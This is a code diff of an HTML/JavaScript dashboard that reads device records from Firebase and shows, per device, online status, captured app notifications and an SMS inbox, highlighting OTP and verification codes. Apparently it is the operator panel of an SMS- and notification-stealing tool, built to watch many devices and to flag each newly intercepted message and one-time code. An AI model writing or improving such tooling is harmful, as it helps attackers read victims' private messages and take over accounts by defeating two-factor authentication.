-                        <span class="msg-time">${parseTimestamp(sms.timestamp)}</span>
+                        <span class="msg-time">${parseTimestamp(newSms.timestamp)}</span>
                     </div>
                     <div class="msg-body ${isOTP ? 'highlight' : ''}">${bodyHtml}</div>
                 `;
-                container.appendChild(div);
-            });
-            container.scrollTop = 0;
+                
+                // Prepend and scroll to top
+                container.prepend(div);
+                container.scrollTop = 0;
+                
+                // Show notification dot
+                document.getElementById('newMsgDot').classList.add('show');
+                
+                // Update device card count
+                updateDeviceCardSmsCount(selectedDeviceId);
+                updateStats();
+                return;
+            }
         }
 
-        // ===== FIREBASE REAL-TIME LISTENERS =====
-        function setupFirebaseListeners() {
-            const usersRef = database.ref('users');
+        // Full render (initial load or when selecting a device)
+        container.innerHTML = '';
 
-            usersRef.on('value', (snapshot) => {
-                const data = snapshot.val();
-                if (data) {
-                    allUsers = data;
-                    renderDevices();
-                    if (selectedDeviceId && allUsers[selectedDeviceId]) {
-                        renderInbox();
-                    }
-                    updateStats();
-                    
-                    if (isInitialLoad) {
-                        isInitialLoad = false;
-                        const ids = Object.keys(allUsers);
-                        if (ids.length > 0) {
-                            selectDevice(ids[0]);
-                        }
-                    }
-                } else {
-                    // Handle case where data is null (no users)
-                    allUsers = {};
-                    renderDevices();
-                    renderInbox();
-                    updateStats();
-                }
-            }, (error) => {
-                console.error("Firebase read failed:", error);
-                document.getElementById('devicesGrid').innerHTML = `<div class="loading">❌ Error connecting to database. Check console.</div>`;
-                showToast('❌ Failed to connect to Firebase');
-            });
-
-            console.log('✅ Firebase real-time listener attached');
-        }
-
-        function updateStats() {
-            // ... (same as before) ...
-            const ids = Object.keys(allUsers);
-            let online = 0;
-            let totalSms = 0;
-            ids.forEach(id => {
-                if (isOnline(allUsers[id])) online++;
-                totalSms += getSmsCount(allUsers[id]);
-            });
-            document.getElementById('onlineCount').textContent = online;
-            document.getElementById('smsCount').textContent = totalSms;
-        }
-
-        function updateDeviceCardSmsCount(deviceId) {
-            // ... (same as before) ...
-            const cards = document.querySelectorAll('.device-card');
-            cards.forEach(card => {
-                if (card.dataset.deviceId === deviceId) {
-                    const countSpan = card.querySelector('.sms-count');
-                    if (countSpan && allUsers[deviceId]) {
-                        countSpan.textContent = getSmsCount(allUsers[deviceId]);
-                    }
-                }
-            });
-        }
-
-        // ===== FILTERS & CONTROLS =====
-        function setFilter(filter) { /* ... */ }
-        function filterDevices() { /* ... */ }
-        function manualRefresh() { /* ... */ }
-
-        // ===== INIT =====
-        document.addEventListener('DOMContentLoaded', () => {
-            setupFirebaseListeners();
+        // Show notifications first
+        notifList.forEach(notif => {
+            const div = document.createElement('div');
+            div.className = 'inbox-message';
+            div.innerHTML = `
+                <div class="msg-header">
+                    <span class="msg-sender">🔔 ${escapeHtml(notif.app || 'Notification')}</span>
+                    <span class="msg-time">${parseTimestamp(notif.timestamp)}</span>
+                </div>
+                <div class="msg-body"><strong>${escapeHtml(notif.title || '')}</strong><br>${escapeHtml(notif.message || '')}</div>
+            `;
+            container.appendChild(div);
         });
 
-        // Make functions global for onclick
-        window.copyToClipboard = copyToClipboard;
-        window.selectDevice = selectDevice;
-        window.setFilter = setFilter;
-        window.filterDevices = filterDevices;
-        window.manualRefresh = manualRefresh;
-        window.showToast = showToast;
-    </script>
+        // Then SMS
+        smsList.forEach(sms => {
+            const div = document.createElement('div');
+            div.className = 'inbox-message';
+            const sender = sms.sender || 'Unknown';
+            const isOTP = /otp|code|verification/i.test(sms.message);
+            let bodyHtml = escapeHtml(sms.message || '');
+            
+            if (isOTP) {
+                const otpMatch = sms.message.match(/\b\d{4,6}\b/);
+                if (otpMatch) {
+                    bodyHtml = bodyHtml.replace(otpMatch[0], `<span class="otp-code">${otpMatch[0]}</span>`);
+                }
+            }
+
+            div.innerHTML = `
+                <div class="msg-header">
+                    <span class="msg-sender">📨 ${escapeHtml(sender)}</span>
+                    <span class="msg-time">${parseTimestamp(sms.timestamp)}</span>
+                </div>
+                <div class="msg-body ${isOTP ? 'highlight' : ''}">${bodyHtml}</div>
+            `;
+            container.appendChild(div);
+        });
+
+        container.scrollTop = 0;
+    }
+
+    function updateDeviceCardSmsCount(deviceId) {
+        const cards = document.querySelectorAll('.device-card');
+        cards.forEach(card => {
+            if (card.dataset.deviceId === deviceId) {
+                const countSpan = card.querySelector('.sms-count');
+                if (countSpan && allUsers[deviceId]) {
+                    countSpan.textContent = getSmsCount(allUsers[deviceId]);
+                }
+            }
+        });
+    }
+
+    function updateStats() {
+        const ids = Object.keys(allUsers);
+        let online = 0;
+        let totalSms = 0;
+
+        ids.forEach(id => {
+            if (isOnline(allUsers[id])) online++;
+            totalSms += getSmsCount(allUsers[id]);
+        });
+
+        document.getElementById('onlineCount').textContent = online;
+        document.getElementById('smsCount').textContent = totalSms;
+    }
+
+    // ===== FILTERS =====
+    function setFilter(filter) {
+        currentFilter = filter;
+        document.querySelectorAll('.toggle-group button').forEach(b => b.classList.remove('active'));
+        if (filter === 'all') document.getElementById('allToggle').classList.add('active');
+        else document.getElementById('onlineToggle').classList.add('active');
+        renderDevices();
+    }
+
+    function filterDevices() {
+        searchQuery = document.getElementById('searchInput').value;
+        renderDevices();
+    }
+
+    function manualRefresh() {
+        showToast('🔄 Refreshing data...');
+        renderDevices();
+        renderInbox();
+        updateStats();
+        showToast('✅ Data refreshed');
+    }
+
+    // ===== FIREBASE REAL-TIME LISTENERS =====
+    function setupFirebaseListeners() {
+        const usersRef = database.ref('users');
+
+        // Listen for all user data changes
+        usersRef.on('value', (snapshot) => {
+            const data = snapshot.val();
+            if (data) {
+                allUsers = data;
+                renderDevices();
+                // Only update inbox if we have a selected device
+                if (selectedDeviceId && allUsers[selectedDeviceId]) {
+                    renderInbox();
+                }
+                updateStats();
+                
+                if (isInitialLoad) {
+                    isInitialLoad = false;
+                    const ids = Object.keys(allUsers);
+                    if (ids.length > 0) {
+                        selectDevice(ids[0]);
+                    }
+                }
+            }
+        });
+
+        // Listen for specific user changes
+        usersRef.on('child_added', (snapshot) => {
+            const key = snapshot.key;
+            const data = snapshot.val();
+            if (key && data) {
+                allUsers[key] = data;
+                renderDevices();
+                updateStats();
+                if (key === selectedDeviceId) {
+                    renderInbox();
+                }
+            }
+        });
+
+        usersRef.on('child_changed', (snapshot) => {
+            const key = snapshot.key;
+            const data = snapshot.val();
+            if (key && data) {
+                const oldData = allUsers[key];
+                allUsers[key] = data;
+                renderDevices();
+                updateStats();
+                
+                // Check if this is the selected device
+                if (key === selectedDeviceId) {
+                    const oldSmsCount = oldData?.sms_logs ? Object.keys(oldData.sms_logs).length : 0;
+                    const newSmsCount = data.sms_logs ? Object.keys(data.sms_logs).length : 0;
+                    
+                    if (newSmsCount > oldSmsCount) {
+                        // Find new message
+                        const oldIds = oldData?.sms_logs ? Object.keys(oldData.sms_logs) : [];
+                        const newIds = data.sms_logs ? Object.keys(data.sms_logs) : [];
+                        const newMsgId = newIds.find(id => !oldIds.includes(id));
+                        
+                        if (newMsgId) {
+                            const newSms = data.sms_logs[newMsgId];
+                            if (newSms) {
+                                showToast(`📨 New SMS from ${newSms.sender || 'Unknown'}`);
+                            }
+                            renderInbox(newMsgId);
+                        } else {
+                            renderInbox();
+                        }
+                    } else {
+                        renderInbox();
+                    }
+                }
+            }
+        });
+
+        usersRef.on('child_removed', (snapshot) => {
+            const key = snapshot.key;
+            if (key && allUsers[key]) {
+                delete allUsers[key];
+                if (selectedDeviceId === key) {
+                    selectedDeviceId = Object.keys(allUsers)[0] || null;
+                }
+                renderDevices();
+                renderInbox();
+                updateStats();
+            }
+        });
+
+        console.log('✅ Firebase real-time listeners connected');
+    }
+
+    // ===== INIT =====
+    document.addEventListener('DOMContentLoaded', () => {
+        setupFirebaseListeners();
+    });
+
+    // Make functions global
+    window.copyToClipboard = copyToClipboard;
+    window.selectDevice = selectDevice;
+    window.setFilter = setFilter;
+    window.filterDevices = filterDevices;
+    window.manualRefresh = manualRefresh;
+    window.showToast = showToast;
+</script>
 </body>
 </html>
